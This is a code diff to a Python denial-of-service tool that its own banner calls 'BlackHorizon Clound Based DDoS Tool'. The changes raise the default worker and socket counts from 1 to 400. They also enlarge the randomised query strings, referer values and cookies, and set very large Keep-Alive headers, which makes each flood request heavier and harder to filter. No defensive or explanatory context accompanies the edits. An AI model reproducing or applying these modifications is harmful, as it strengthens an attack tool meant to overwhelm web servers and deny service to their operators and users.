@@ -58,8 +58,8 @@ METHOD_RAND = 'random'
 
 JOIN_TIMEOUT=1.0
 
-DEFAULT_CLOUNDS=1
-DEFAULT_SOCKETS=1
+DEFAULT_CLOUNDS=400
+DEFAULT_SOCKETS=400
 
 BLACKHORIZON_BANNER = 'BlackHorizon Clound Based DDoS Tool Created ANONYMOUS MEMBERS'
 
@@ -381,8 +381,8 @@ class Striker(Process):
 
         for i in range(ammount):
 
-            key = self.buildblock(random.randint(3,10))
-            value = self.buildblock(random.randint(3,20))
+            key = self.buildblock(random.randint(9,16))
+            value = self.buildblock(random.randint(6,25))
             element = "{0}={1}".format(key, value)
             queryString.append(element)
 
@@ -409,7 +409,7 @@ class Striker(Process):
 
     def generateRequestUrl(self, param_joiner = '?'):
 
-        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
+        return self.url + param_joiner + self.generateQueryString(random.randint(9,13))
 
     def getUserAgent(self):
 
@@ -480,7 +480,7 @@ class Striker(Process):
             'Cache-Control': noCache,
             'Accept-Encoding': ', '.join(roundEncodings),
             'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(1,1000),
+            'Keep-Alive': random.randint(1000000,1000000000),
             'Host': self.host,
         }
     
@@ -496,12 +496,12 @@ class Striker(Process):
 
         if random.randrange(2) == 0:
             # Random Referer
-            url_part = self.buildblock(random.randint(5,10))
+            url_part = self.buildblock(random.randint(10,15))
 
             random_referer = random.choice(self.referers) + url_part
             
             if random.randrange(2) == 0:
-                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
+                random_referer = random_referer + '?' + self.generateQueryString(random.randint(10, 19))
 
             http_headers['Referer'] = random_referer
 
@@ -511,7 +511,7 @@ class Striker(Process):
 
         if random.randrange(2) == 0:
             # Random Cookie
-            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
+            http_headers['Cookie'] = self.generateQueryString(random.randint(10, 15))
 
         return http_headers
 
